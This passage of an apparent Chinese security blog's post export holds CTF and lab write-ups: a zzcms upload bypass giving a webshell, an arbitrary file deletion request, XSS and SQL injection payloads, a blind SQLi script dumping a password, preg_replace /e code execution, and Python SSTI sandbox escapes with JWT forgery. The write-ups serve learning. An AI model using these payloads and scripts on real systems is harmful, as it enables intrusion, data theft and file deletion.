||strpos($hzm,\"jsp\")!==false)&#123;echo \"&lt;script&gt;alert('\".$hzm.\"，这种文件不允许上传');parent.window.close();&lt;/script&gt;\";exit;&#125; 在该文件中，可以找到后端对上传文件验证的代码，有四个步骤的验证，第一是检查是否存在上传的文件，第二是检查文件的大小，第三是检查文件类型必须是规定的图片类型，见第12行 1private $uptypes = array ('image/jpg','image/jpeg','image/pjpeg','image/gif','image/png','image/x-png','image/bmp','application/x-shockwave-flash'); 最后检查的是文件后缀，禁止后缀名包含php，asp和jsp的文件，但是它忽略了phtml文件，而apache会将phtml文件当做php文件来解析，所以我们只需要将文件名后缀修改为phtml，文件类型修改为image/jpg，即可以成功绕过过滤上传一句话木马文件 复现根据上面的分析，我修改了如下的payload 但是可以发现上传失败了，提示了“经判断上传的文件不是图片文件，已删除”，根据提示在原文件找到之前忽略了的过滤点 12345#/uploadimg.php 第58-61行$data=GetImageSize($newName);//取得GIF、JPEG、PNG或SWF图片属性，返回数组，图形的宽度[0],图形的高度[1]，文件类型[2]if($data[2]!=1 &amp;&amp; $data[2]!=2 &amp;&amp; $data[2]!=3 &amp;&amp; $data[2]!=6)&#123;//4为swf格式unlink($newName);echo \"&lt;script&gt;alert('经判断上传的文件不是图片文件，已删除。');parent.window.close();&lt;/script&gt;\";exit; 我们可以注意到一个函数GetImageSize，这个函数可以取得图片的各个属性，之后就可以判断该文件是否是一个图片文件。所以这里在文件的内容头部加入GIF89A，以此来绕过GetImageSize的检查，如下所示 修改后成功上传一句话木马文件，并在返回内容我们可以很清晰的看出上传文件的具体位置 最后上菜刀验证 成功getshell 任意文件删除漏洞位置/user/adv.php 第76-85行 分析1234567891011121314151617181920212223#/user/adv.php ...... if (isset($_REQUEST[\"img\"]))&#123;$img=$_REQUEST[\"img\"];&#125;else&#123;$img=\"\";&#125;if (isset($_REQUEST[\"oldimg\"]))&#123;$oldimg=$_REQUEST[\"oldimg\"];&#125;else&#123;$oldimg=\"\";&#125; ......if ($action==\"modify\")&#123;query(\"update zzcms_textadv set adv='$adv',company='$company',advlink='$advlink',img='$img',passed=0 where username='\".$_COOKIE[\"UserName\"].\"'\");if ($oldimg&lt;&gt;$img)&#123; $f=\"../\".$oldimg; if (file_exists($f))&#123; unlink($f); &#125;&#125; 我们可以发现变量$f是通过”../“与变量$oldimg拼接而成的，拼接后的文件名如果存在就通过unlink函数进行文件删除操作，而这里对变量$olding没有什么其他的过滤，只要求不等于变量$img，且$action等于”modify”，那么我们就可以通过控制变量$olding的值进行任意文件删除 复现我们先在网站根目录下创建一个文件夹，里面新建文件1.php，2.txt 然后构造如下payload： 1234567891011121314POST /user/adv.php HTTP/1.1Host: 127.0.0.1Cache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: PHPSESSID=adad7183ca248a9be539f0a153ce72f8; bdshare_firstime=1551059496947; UserName=test; PassWord=098f6bcd4621d373cade4e832627b4f6Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 41action=modify&amp;img=test&amp;oldimg=demo/1.php 后记这是第一次审计一个完整的cms，大部分还是参考网上前辈们的文章来审计，感受到自己独立审计的能力还有很大的不足，今后还需要通过多练，多花时间来加强自己的审计能力。","categories":[{"name":"代码审计","slug":"代码审计","permalink":"https://Foxgrin.github.io/categories/代码审计/"}],"tags":[{"name":"代码审计","slug":"代码审计","permalink":"https://Foxgrin.github.io/tags/代码审计/"}]},{"title":"Web_For_Pentester-XSS","slug":"Web_For_Pentester-XSS","date":"2019-01-29T08:26:00.000Z","updated":"2019-01-30T09:02:45.172Z","comments":true,"path":"/posts/22876/","link":"","permalink":"https://Foxgrin.github.io/posts/22876/","excerpt":"Web_For_Pentester渗透测试环境中的xss注入关卡部分","text":"Web_For_Pentester渗透测试环境中的xss注入关卡部分 Example 1 典型的反射型XSS，将我们通过GET方式输入的参数name直接输出 payload:http://192.168.187.141/xss/example1.php?name=%3Cscript%3Ealert(%27xss%27)%3C/script%3E Example 2 对GET方式输入的参数name进行正则匹配过滤，使用了函数preg_replace过滤了script标签： 123$name = $_GET['name'];$name = preg_replace(\"/&lt;script&gt;/\",\"\",$name);$name = preg_replace(\"/&lt;\\/script&gt;/\",\"\",$name); 但我们知道preg_replace是非常不安全的，有非常多的方法可以绕过，这里我们只需要利用大写即可非常轻松的绕过过滤 payload:http://192.168.187.141/xss/example2.php?name=%3CScript%3Ealert(%27xss%27)%3C/Script%3E Example 3 这关同样是正则匹配过滤，区别于上一关的是这里用了匹配修饰符/i，所以不论大小写都会被过滤 123$name = $_GET['name'];$name = preg_replace(\"/&lt;script&gt;/i\",\"\",$name);$name = preg_replace(\"/&lt;\\/script&gt;/i\",\"\",$name); 所以我们换一种方式，双写即可绕过 payload:http://192.168.187.141/xss/example3.php?name=%3Cs%3Cscript%3Ecript%3Ealert(%27xss%27)%3C/s%3C/script%3Ecript%3E Example 4 这关通过正则匹配过滤了关键字script，并且通过修饰符/i无视大小写 123if(preg_match(\"/script/i\",$_GET['name']))&#123; die(\"error\");&#125; 排除script，我们还可以通过onerror事件进行xss攻击 payload: http://192.168.187.141/xss/example4.php?name=%3Cimg%20src=1%20onerror=alert(%22xss%22)%3E Example 5 过滤了关键字alert，但是script未被过滤，除了alert外还有其他方法，如下 123alert() 弹出个提示框 （确定） confirm() 弹出个确认框 （确定，取消） prompt() 弹出个输入框 让你输入东西 payload: http://192.168.187.141/xss/example5.php?name=%3Cscript%3Econfirm(%27xss%27)%3C/script%3E http://192.168.187.141/xss/example5.php?name=%3Cscript%3Eprompt(%27xss%27)%3C/script%3E Example 6 这关是直接将我们输入的参数name的值赋值给脚本变量a，从页面源代码也可以看出 1234Hello &lt;script&gt; var $a= \"hacker\";&lt;/script&gt; payload： http://192.168.187.141/xss/example6.php?name=hacker%22;alert(%27xss%27);// Example 7 这关区别在于是通过单引号闭合，所以将上一关的payload中的双引号改为单引号即可 payload： http://192.168.187.141/xss/example7.php?name=hacker%27;alert(%27xss%27);// Example 8本关的源代码如下： 12345678910111213141516&lt;?php require_once &apos;../header.php&apos;; if (isset($_POST[&quot;name&quot;])) &#123; echo &quot;HELLO &quot;.htmlentities($_POST[&quot;name&quot;]); &#125;?&gt;&lt;form action=&quot;&lt;?php echo $_SERVER[&apos;PHP_SELF&apos;]; ?&gt;&quot; method=&quot;POST&quot;&gt; Your name:&lt;input type=&quot;text&quot; name=&quot;name&quot; /&gt; &lt;input type=&quot;submit&quot; name=&quot;submit&quot;/&gt;&lt;?php require_once &apos;../footer.php&apos;; ?&gt; 可有发现参数name经过htmlentities函数处理，这是一个可以将html标签的尖括号转义的函数，所以我们无法通过参数name进行xss攻击，仔细一看这里面还有一个可控的参数$_SERVER[‘PHP_SELF’]，来看看PHP手册对这个参数的说明： 12&apos;PHP_SELF&apos;当前执行脚本的文件名，与 document root 有关。例如，在地址为 http://example.com/foo/bar.php 的脚本中使用 $_SERVER[&apos;PHP_SELF&apos;] 将得到 /foo/bar.php。__FILE__ 常量包含当前(例如包含)文件的完整路径和文件名。 从 PHP 4.3.0 版本开始，如果 PHP 以命令行模式运行，这个变量将包含脚本名。之前的版本该变量不可用。 所以我们可以通过改变url来改变这个变量的值 payload： http://192.168.187.141/xss/example8.php/%22%20method=%22POST%22%3E%20%3Cscript%3Ealert(&#39;xss&#39;)%3C/script%3E 这时看一下页面的源代码： 123&lt;form action=\"/xss/example8.php/\" method=\"POST\"&gt; &lt;script&gt;alert('xss')&lt;/script&gt;\" method=\"POST\"&gt; Your name:&lt;input type=\"text\" name=\"name\" /&gt; &lt;input type=\"submit\" name=\"submit\"/&gt; 成功插入恶意脚本代码 Example 9源代码： 123&lt;script&gt; document.write(location.hash.substring(1));&lt;/script&gt; location.hash是指url中#后面的内容，substring(1)从第一个字符开始 payload: http://192.168.187.141/xss/example9.php#%3Cscript%3Ealert(&#39;xss&#39;)%3C/script%3E 但是这里没有弹框，有点奇怪","categories":[{"name":"xss","slug":"xss","permalink":"https://Foxgrin.github.io/categories/xss/"}],"tags":[{"name":"xss","slug":"xss","permalink":"https://Foxgrin.github.io/tags/xss/"}]},{"title":"Web_For_Pentester-Sql_injection","slug":"Web_For_Pentester-Sql_injection","date":"2019-01-25T11:35:00.000Z","updated":"2019-01-29T08:21:43.767Z","comments":true,"path":"/posts/18158/","link":"","permalink":"https://Foxgrin.github.io/posts/18158/","excerpt":"Web_For_Pentester渗透测试环境中的Sql注入关卡部分","text":"Web_For_Pentester渗透测试环境中的Sql注入关卡部分 Example 1从页面初始的URL就可以看出注入点在于name参数，改变name参数的值为root’，发现没有查询结果，再次改变name参数值为root’%23，发现得到正确查询结果 说明了参数name是被单引号包裹的，而且这里没有报错信息，于是直接采用联合注入即可 注出查询列数payload:http://192.168.187.141/sqli/example1.php?name=root%27%20order%20by%205%20%23 注出数据库名payload:http://192.168.187.141/sqli/example1.php?name=root%27%20union%20select%201,2,database(),4,5%23 注出数据表名payload:http://192.168.187.141/sqli/example1.php?name=root%27%20union%20select%201,2,(select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()),4,5%23 注出数据列名payload:http://192.168.187.141/sqli/example1.php?name=root%27%20union%20select%201,2,(select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=%27users%27),4,5%23 Example 2，3这关过滤了空格，用/**/来代替空格即可，payload跟第一关一样，空格替换一下即可 Example 4 从这关源代码可以看出，参数id经过函数mysql_real_escape_string过滤，但是仔细看sql语句，我们可以发现这里参数id并没有任何引号的包裹，所以这个过滤函数实质上并不影响我们的注入过程，payload同样参考第一关即可 Example 5 这关用到了一个正则匹配表达式 1preg_match('/^[0-9]+/') 符合匹配的内容是开头是数字，但这里的参数id本来值本来就是数字，所以这个过滤其实没有多大影响，payload跟第四关是一样的 Example 6 这关一样用到了正则匹配 1preg_match('/^[0-9]+$/') 符合匹配的内容是结尾是数字 注出数据库名的payload:http://192.168.187.141/sqli/example6.php?id=2%20union%20select%201,2,database(),4,5 Example 7 这关的正则匹配式是 1preg_match('/^-?[0-9]+$/m') 符合匹配的内容是必须开头到结尾都是数字，但是这里用到了一个正则模式修饰符/m，这个修饰符的作用是如果检查的字符串中包含了换行符\\n，那么行首和行末就会匹配到换行符的之前和之后，简单而言，就是如果有换行符，那么换行符之前的字符串符合就匹配成功，换行符\\n的URL编码是%0a 给出注出数据库名的payload:http://192.168.187.141/sqli/example7.php?id=2%0aunion%20select%201,2,database(),4,5 Example 8 这关涉及到order by后面的注入，排除联合注入，报错注入，所以只剩下盲注了，这里我采用的是基于时间的盲注 给出注出数据库名的具体payload:http://192.168.187.141/sqli/example8.php?order=name`,(select%20case%20when%20(ascii(substr(database(),1,1))=100)%20then%20sleep(1)%20else%201%20end)%23 有了payload，剩下的就是写脚本注入了，脚本代码如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879import requests#注数据库名database = \"\"flag = 0for i in range(1,50): #print(\"开始对数据库名的第\"+str(i)+\"位进行注入\") for j in range(48,123): #print(\"[+]checking \"+chr(j)) url = \"http://192.168.187.141/sqli/example8.php?order=name`,(select%20case%20when%20(ascii(substr(database(),\"+str(i)+\",1))=\"+str(j)+\")%20then%20sleep(1)%20else%201%20end)%23\" r = requests.get(url) t = r.elapsed.total_seconds() if t&gt;=4: database = database + chr(j) print(\"成功注出数据库名的第\"+str(i)+\"位: \"+chr(j)) flag = 1 break if flag == 0 and j == 122: print(\"数据库名: \"+database) break else: flag = 0#注数据表名table_name = \"\"flag = 0for i in range(1,50): for j in range(44,123): url = \"http://192.168.187.141/sqli/example8.php?order=name`,(select%20case%20when%20(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),\"+str(i)+\",1))=\"+str(j)+\")%20then%20sleep(1)%20else%201%20end)%23\" r = requests.get(url) t = r.elapsed.total_seconds() if t&gt;=4: table_name = table_name + chr(j) print(\"成功注出数据表名的第\"+str(i)+\"位: \"+chr(j)) flag = 1 break if flag == 0 and j == 122: print(\"数据表名: \"+table_name) break else: flag = 0#注users表下的所有数据列名column_name = \"\"flag = 0for i in range(1,50): for j in range(44,123): url = \"http://192.168.187.141/sqli/example8.php?order=name`,(select%20case%20when%20(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=0x7573657273),\"+str(i)+\",1))=\"+str(j)+\")%20then%20sleep(1)%20else%201%20end)%23\" r = requests.get(url) t = r.elapsed.total_seconds() if t&gt;=4: column_name = column_name + chr(j) print(\"成功注出数据表名的第\"+str(i)+\"位: \"+chr(j)) flag = 1 break if flag == 0 and j == 122: print(\"users表下的所有数据列名: \"+column_name) break else: flag = 0#注root用户的密码passwd = \"\"flag = 0for i in range(1,50): for j in range(44,123): url = \"http://192.168.187.141/sqli/example8.php?order=name`,(select%20case%20when%20(ascii(substr((select passwd from users where name=0x726f6f74),\"+str(i)+\",1))=\"+str(j)+\")%20then%20sleep(1)%20else%201%20end)%23\" r = requests.get(url) t = r.elapsed.total_seconds() if t&gt;=4: passwd = passwd + chr(j) print(\"成功注出root用户的密码的第\"+str(i)+\"位: \"+chr(j)) flag = 1 break if flag == 0 and j == 122: print(\"root用户的密码: \"+passwd) break else: flag = 0 这里要注意的是我们输入的order参数是经过mysql_real_escape_string函数过滤的，所以例如payload中某些表名users，需要转化为十六进制0x7573657273 Example 9 同样是order by后的注入，区别于上一关的是，这里没有，所以稍微修改一下payload即可 同样给出注出数据名的payload:http://192.168.187.141/sqli/example9.php?order=name,(select%20case%20when%20(ascii(substr(database(),1,1))=101)%20then%20sleep(1)%20else%201%20end) 脚本也是上一关的脚本代码稍加修改一下payload部分即可，这里就不再赘述了","categories":[{"name":"sql","slug":"sql","permalink":"https://Foxgrin.github.io/categories/sql/"}],"tags":[{"name":"sql","slug":"sql","permalink":"https://Foxgrin.github.io/tags/sql/"}]},{"title":"代码审计-通过preg_replace函数深入命令执行","slug":"代码审计-通过preg_replace函数深入命令执行","date":"2018-10-16T15:41:00.000Z","updated":"2018-10-22T13:53:08.012Z","comments":true,"path":"/posts/41464/","link":"","permalink":"https://Foxgrin.github.io/posts/41464/","excerpt":"代码审计day1","text":"代码审计day1 前言最近开始学习代码审计，刚好mochazz学长的团队红日安全-代码审计小组正在做一个PHP代码审计的项目，该项目会对一道题目进行细致的分析，我觉得很适合新手学习，就跟进他们的项目，对项目中的题目写出我自己的想法。希望能有所进步。 题目1这道题的名字叫做蜡烛 12345678910111213141516&lt;?php function complexStrtolower($regex,$value)&#123; return preg_replace( &apos;/(&apos;. $regex . &apos;)/ei&apos;, &apos;strtolower(&quot;\\\\1&quot;)&apos;, $value ); &#125; foreach($_GET as $regex =&gt; $value)&#123; echo complexStrtolower($regex,$value) . &quot;\\n&quot;; &#125; print_r($_GET); ?&gt; 代码很短，考察的是preg_replace/e模式执行任意代码，我们很清楚preg_replace函数是通过正则匹配出符合的字符串并对匹配出的字符串进行替换，而preg_replace/e模式则可以执行匹配出的字符串，这就导致了命令执行的漏洞。我们先来详细了解一下preg_replace函数 12345678910preg_replace：(PHP 5.5)功能 ： 函数执行一个正则表达式的搜索和替换定义 ： mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] )搜索 subject 中匹配 pattern 的部分， 如果匹配成功以 replacement 进行替换$pattern 存在 /e 模式修正符，允许代码执行/e 模式修正符，是 preg_replace() 将 $replacement 当做php代码来执行 这里使用了/e模式，输入的参数和对应的参数值分别对应于匹配的模式和用于正则匹配的字符串，这两个参数都可以通过GET方式进行控制，但是第二个参数写定了‘strtolower(“\\\\1”)’，那么要如何执行代码呢 解析1‘strtolower(“\\\\1”)’其实涉及了正则的反向引用，我们可以看一下W3Cschool对它的解释： 123反向引用对一个正则表达式模式或部分模式 两边添加圆括号 将导致相关 匹配存储到一个临时缓冲区 中，所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储。缓冲区编号从 1 开始，最多可存储 99 个捕获的子表达式。每个缓冲区都可以使用 &apos;\\n&apos; 访问，其中 n 为一个标识特定缓冲区的一位或两位十进制数。 \\\\1实际上就是\\1，即第一个匹配项。那么就很好办，payload已经大致出来了，我们只需要控制匹配模式为/(.*)/ ，匹配的字符串为phpinfo()，就可以执行命令 现在本地测试一下 123&lt;?phppreg_replace('/(.*)/ie','strtolower(\"\\\\1\")','phpinfo()');?&gt; 没有成功执行，为什么呢，试着输出函数执行结果，结果为phpinfo() 其实，我们执行函数preg_replace/e，就是执行下面的过程 123456preg_match('/(.*)/i',$value,$match);eval('strtolower(\"$match[0]\");');当我们输入$value = 'phpinfo()'时$match[0] = 'phpinfo()';eval('strtolower(\"phpinfo()\");');执行结果自然是'phpinfo()' 因为preg_replace/e只执行一次代码，即strtolower函数，所以我们必须想办法让输入的phpinfo()自己执行，这就涉及到了php动态变量，根据原贴给出payload为{${phpinfo()}}，我一开始也很困惑为什么，我们知道php变量名经过{}包裹后会将变量值输出,而这里phpinfo被{}包裹后会首先执行phpinfo()，执行结果返回true，那么我们画一个等价的式子 1&#123;$&#123;phpinfo()&#125;&#125; == &#123;$true&#125; == &#123;null&#125; == &apos;&apos; 我们继续测试一下： 123&lt;?phppreg_replace('/(.*)/ie','strtolower(\"\\\\1\")','&#123;$&#123;phpinfo()&#125;&#125;');?&gt; 成功执行了代码phpinfo() 解析2那么payload是不是已经很明显了：/?.*={${phpinfo()}} 并没有成功执行，这是因为我们之前是将.*直接写入程序的正则表达式中，而本题我们是需要通过GET方式提交.*，而很明显我们通过GET提交是没有成功执行phpinfo()，我们可以用var_dump试着输出一下GET数组 我们可以看到点号.被替换成了下划线_，这是因为php自动将非法字符替换成了下划线，我们换个通用字符即可，因此payload:/?\\S*={${phpinfo()}} 成功执行代码 总结命令执行的函数我们比较熟悉的是eval,assert，今天通过这个例子，学习了preg_replace/e函数执行任意代码，很感谢红日团队提供这么有趣的题目，之后将继续跟进红日团队的审计项目，学习代码审计。 最后附上参考文章：深入研究preg_replace与代码执行","categories":[{"name":"代码审计","slug":"代码审计","permalink":"https://Foxgrin.github.io/categories/代码审计/"}],"tags":[{"name":"代码审计","slug":"代码审计","permalink":"https://Foxgrin.github.io/tags/代码审计/"}]},{"title":"Python沙箱逃逸","slug":"Python沙箱逃逸","date":"2018-09-19T14:39:00.000Z","updated":"2018-09-19T17:17:20.526Z","comments":true,"path":"/posts/57375/","link":"","permalink":"https://Foxgrin.github.io/posts/57375/","excerpt":"之前接触的大部分是PHP写的服务器端，而除了PHP，Python也可以作为服务器端的语言，利用的是Python的flask模块渲染html模板，同时也可能存在Python语句执行的漏洞，这就是SSTI漏洞，即服务器端模板注入，本篇文章通过网鼎杯的两道SSTI题简单学习了解一下Python沙箱逃逸的原理","text":"之前接触的大部分是PHP写的服务器端，而除了PHP，Python也可以作为服务器端的语言，利用的是Python的flask模块渲染html模板，同时也可能存在Python语句执行的漏洞，这就是SSTI漏洞，即服务器端模板注入，本篇文章通过网鼎杯的两道SSTI题简单学习了解一下Python沙箱逃逸的原理 网鼎杯第二场Web：calc题目如下，是一个计算器，可以执行一些简单的算式，根据题目的提示，可能对我们的输入存在正则匹配过滤，需要我们注意正则表达式 1^[0-9.]+\\s*[*+-/]\\s*[0-9.]+ 这里的正则表达式存在两个问题 1.首先是[*+-/]，我们知道’-‘在正则表达式里有特别的意义，表示范围，而在这里并没有被转义，说明是从’+’-‘/‘的字符 2.正则表达式并没有给出$结尾符，说明我们只需要符合前面的匹配，后面可以任意构造语句执行 我们可以试着访问index.php 出现了报错信息 从报错信息可以看出，这里是python写的web 这里先给出payload: 11+1,().__class__.__base__.__subclasses__()[40](&apos;/flag&apos;).read() 下面我们在Python 2.7环境中一步步看看 1().__class__.__base__.__subclasses__()[40](&apos;/flag&apos;).read() 为什么就能读取flag 123456789101112131415161718192021222324252627282930313233343536373839&gt;&gt;&gt; ().__class__&lt;type 'tuple'&gt;&gt;&gt;&gt; ().__class__&lt;type 'tuple'&gt;&gt;&gt;&gt; ().__class__.__base__&lt;type 'object'&gt;&gt;&gt;&gt; ().__class__.__base__.__subclasses__&lt;built-in method __subclasses__ of type object at 0x6CFEA8E0&gt;&gt;&gt;&gt; ().__class__.__base__.__subclasses__()[&lt;type 'type'&gt;, &lt;type 'weakref'&gt;, &lt;type 'weakcallableproxy'&gt;, &lt;type 'weakproxy'&gt;, &lt;type 'int'&gt;, &lt;type 'basestring'&gt;, &lt;type 'bytearray'&gt;, &lt;type 'list'&gt;, &lt;type 'NoneType'&gt;, &lt;type 'NotImplementedType'&gt;, &lt;type 'traceback'&gt;, &lt;type 'super'&gt;, &lt;type 'xrange'&gt;, &lt;type 'dict'&gt;, &lt;type 'set'&gt;, &lt;type 'slice'&gt;, &lt;type 'staticmethod'&gt;, &lt;type 'complex'&gt;, &lt;type 'float'&gt;, &lt;type 'buffer'&gt;, &lt;type 'long'&gt;, &lt;type 'frozenset'&gt;, &lt;type 'property'&gt;, &lt;type 'memoryview'&gt;, &lt;type 'tuple'&gt;, &lt;type 'enumerate'&gt;, &lt;type 'reversed'&gt;, &lt;type 'code'&gt;, &lt;type 'frame'&gt;, &lt;type 'builtin_function_or_method'&gt;, &lt;type 'instancemethod'&gt;, &lt;type 'function'&gt;, &lt;type 'classobj'&gt;, &lt;type 'dictproxy'&gt;, &lt;type 'generator'&gt;, &lt;type 'getset_descriptor'&gt;, &lt;type 'wrapper_descriptor'&gt;, &lt;type 'instance'&gt;, &lt;type 'ellipsis'&gt;, &lt;type 'member_descriptor'&gt;, &lt;type 'file'&gt;, &lt;type 'PyCapsule'&gt;, &lt;type 'cell'&gt;, &lt;type 'callable-iterator'&gt;, &lt;type'iterator'&gt;, &lt;type 'sys.long_info'&gt;, &lt;type 'sys.float_info'&gt;, &lt;type 'EncodingMap'&gt;, &lt;type 'fieldnameiterator'&gt;, &lt;type 'formatteriterator'&gt;, &lt;type 'sys.version_info'&gt;, &lt;type 'sys.flags'&gt;, &lt;type 'sys.getwindowsversion'&gt;, &lt;type 'exceptions.BaseException'&gt;, &lt;type 'module'&gt;, &lt;type 'imp.NullImporter'&gt;, &lt;type 'zipimport.zipimporter'&gt;, &lt;type 'nt.stat_result'&gt;, &lt;type 'nt.statvfs_result'&gt;, &lt;class 'warnings.WarningMessage'&gt;, &lt;class 'warnings.catch_warnings'&gt;, &lt;class '_weakrefset._IterationGuard'&gt;, &lt;class '_weakrefset.WeakSet'&gt;, &lt;class '_abcoll.Hashable'&gt;, &lt;type 'classmethod'&gt;, &lt;class '_abcoll.Iterable'&gt;, &lt;class '_abcoll.Sized'&gt;, &lt;class '_abcoll.Container'&gt;, &lt;class '_abcoll.Callable'&gt;, &lt;type 'dict_keys'&gt;, &lt;type 'dict_items'&gt;, &lt;type 'dict_values'&gt;, &lt;class 'site._Printer'&gt;, &lt;class 'site._Helper'&gt;, &lt;type '_sre.SRE_Pattern'&gt;, &lt;type '_sre.SRE_Match'&gt;, &lt;type '_sre.SRE_Scanner'&gt;, &lt;class 'site.Quitter'&gt;, &lt;class 'codecs.IncrementalEncoder'&gt;, &lt;class 'codecs.IncrementalDecoder'&gt;, &lt;type 'operator.itemgetter'&gt;, &lt;type 'operator.attrgetter'&gt;, &lt;type 'operator.methodcaller'&gt;, &lt;type 'functools.partial'&gt;, &lt;type 'MultibyteCodec'&gt;, &lt;type 'MultibyteIncrementalEncoder'&gt;, &lt;type 'MultibyteIncrementalDecoder'&gt;, &lt;type 'MultibyteStreamReader'&gt;, &lt;type 'MultibyteStreamWriter'&gt;]&gt;&gt;&gt; ().__class__.__base__.__subclasses__()[40]&lt;type 'file'&gt;&gt;&gt;&gt; 我们可以发现 1().__class__.__base__.__subclasses__()[40] 返回的是file类型，我们在后面传入文件名，就相当于读取文件 这就是python沙箱逃逸的原理 具体可以参考https://www.aliyun.com/jiaocheng/437857.html 网鼎杯第三场：mmmmy 题目是一个登陆页面，随手试一下用户名test，密码test，成功登录，点击留言，提示只有admin用户才能留言，猜测必须用admin用户登陆，抓包观察 发现登陆时同时设置了cookie的token字段，而在此访问时，服务器根据token字段识别test用户，观察token值，是经过JWT加密后的值，首先使用 c-jwt-cracker 爆破 secret key，结果为 6a423，然后到https://jwt.io/进行加密 加密后的token值替换原本test的token值伪造admin用户登陆 然后这里的留言post的text存在SSTI漏洞，但是这里过滤了双花括号的写法，我们可以换成流程控制结构的写法 执行语句 ，测试如下： 后面的数据就要依靠盲注出来了 1text=&#123;% if ().__class__.__base__.__subclasses__()[40]('/flag').read()[0]=='f' %&#125;1&#123;% else %&#125;0&#123;% endif %&#125; 但是这里还过滤了一些关键字，例如’_’，所以我们可以将这些关键属性class,base等放入别的参数，从而绕过对text参数过滤 使用payload如下： 1text=&#123;% if request.values.e[18] == ()[request.values.a][request.values.b][request.values.c]()[40](request.values.d).read()[0] %&#125;good&#123;% endif %&#125;&amp;a=__class__&amp;b=__base__&amp;c=__subclasses__&amp;d=/flag&amp;e=&#125;-&#123;0123456789abcdefghijklmnopqrstuvwxyz 脚本如下： 1234567891011121314151617181920212223242526272829303132333435import requestsurl = \"http://0fe97b99c09c4a1cbf5eb0610879c4e93f084e23d438487d.game.ichunqiu.com/bbs\"all_string = \"&#125;-&#123;0123456789abcdefghijklmnopqrstuvwxyz\"flag = \"\"cookie = &#123; \"token\" : \"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.IXEkNe82X4vypUsNeRFbhbXU4KE4winxIhrPiWpOP30\"&#125;for i in range(100): f = 1 for j in range(39): print('checking '+all_string[j]) data = &#123; 'text':\"&#123;%% if request.values.e[%d] == ()[request.values.a][request.values.b][request.values.c]()[40](request.values.d).read()[%d] %%&#125;good&#123;%% endif %%&#125;\"%(j,i), 'a':'__class__', 'b':'__base__', 'c':'__subclasses__', 'd':'/flag', 'e':all_string &#125; r = requests.post(url=url,data=data,cookies=cookie) if 'good' in r.text: flag = flag + all_string[j] print('the '+str(i)+' place of flag is: '+all_string[j]) break elif 'good' not in r.text and j == 38: f = 0 break if f == 0: break print('flag: ' + flag)#flag: flag&#123;49ec4dfd-6600-4651-a5ff-9c190562991f&#125;","categories":[{"name":"ctf","slug":"ctf","permalink":"https://Foxgrin.github.io/categories/ctf/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://Foxgrin.github.io/tags/ctf/"}]},{"title":"2018黑盾杯Web","slug":"黑盾杯Web","date":"2018-09-16T06:34:00.000Z","updated":"2018-09-17T12:25:28.187Z","comments":true,"path":"/posts/15234/","link":"","permalink":"https://Foxgrin.github.io/posts/15234/","excerpt":"2018黑盾杯Web题解","text":"2018黑盾杯Web题解 无论你输入什么都是错的bp抓包获得源代码发现 1&lt;form id=&quot;form1&quot; name=&quot;form1&quot; method=&quot;get&quot; action=&quot;da.html&quot;&gt; 访问da.html 源代码中发现flag 1&lt;!-- flag&#123;250872eab74e4ae2d11ff2b5b3fcb1a5&#125;!--&gt; 听说很漂亮bp抓包发现js代码： 1234567891011121314151617181920212223&lt;script type=\"text/javascript\"&gt; document.oncontextmenu=function()&#123;return false&#125;; var a,b,c,d,e,f,g; a = 6.10; b = a * 2; c = a + b; d = c / b + a; e = c - d * b + a; f = e + d /c -b * a; g = f * e - d + c * b + a; a = g * g; a = Math.floor(a); function check()&#123; if(document.getElementById(\"txt\").value==a)&#123; return true; &#125;else&#123; alert(\"密码错误\"); return false; &#125; &#125;&lt;/script&gt; 需要GET参数txt值等于a的值 在本地运行测试a的值为98910652 payload: 123456789101112131415POST /web/beautiful/ HTTP/1.1Host: 192.168.200.200Cache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8Referer: http://192.168.3.1/student/exam-second/seize-flagAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: PHPSESSID=i8h2rmbg3p18n5mt0ppar8a4d5Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 12txt=98910652 获得flag:flag{4b5aabaa648c42c53d39935e7ff663b9} 信息泄露加代码审计访问/.svn存在泄露文件获得源代码 1234567891011121314151617181920&lt;?phperror_reporting(0);$user = $_COOKIE['user'];$code = $_GET['code']?(int)$_GET['code']:'';if($user == 'admin' &amp;&amp; !empty($code)) &#123; $hex = (int)$code; if(($hex ^ 6789) === 0xCDEF) &#123; require(\"flag.php\"); echo $flag; exit(); &#125; &#125;echo \"缺少应有的参数,你没有权限查看本内容\";?&gt; 获得flag条件是$user=admin，$code ^ 6789 = 0xCDEF 写个脚本爆破code 1234for i in range(1000000): if i ^ 6789 == 0xCDEF: print(i) break 运行结果：55146 payload: 1234567891011GET /web/codeaudit/?code=55146 HTTP/1.1Host: 192.168.200.200Cache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8Referer: http://192.168.3.1/student/exam-second/seize-flagAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: PHPSESSID=i8h2rmbg3p18n5mt0ppar8a4d5;user=adminConnection: close flag: 